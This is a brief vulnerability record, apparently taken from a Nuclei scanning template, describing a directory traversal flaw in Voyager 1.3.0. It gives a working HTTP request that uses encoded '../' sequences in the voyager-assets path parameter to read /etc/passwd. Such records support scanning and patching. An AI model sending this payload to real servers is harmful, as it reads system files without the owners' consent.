# Vulnerability: Voyager 1.3.0 - Directory Traversal
**Classification:** CWE-22
**Source:** Nuclei Template (`voyager-lfi.yaml`)

## Description
Voyager 1.3.0 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd
```

